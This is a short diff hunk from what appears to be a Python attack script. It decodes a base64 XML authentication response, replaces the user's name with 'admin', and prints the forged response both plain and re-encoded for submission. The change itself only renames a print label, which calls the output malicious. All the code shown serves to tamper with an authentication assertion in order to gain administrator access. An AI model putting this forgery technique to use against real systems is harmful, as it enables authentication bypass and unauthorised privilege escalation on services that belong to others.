@@ -23,7 +23,7 @@ else:
         response = b64decode(stri)
         decoded= str(response.decode('utf-8'))
         mal_response = decoded.replace(username, "admin")
-        print(" [+] Orignal XML Response:")
+        print(" [+] Malicious XML Response before encoding:")
         print(mal_response)
         print(" [+] Malcious XML response, encoded:")
         print(urllib.parse.quote(b64encode(mal_response.encode('utf-8'))))
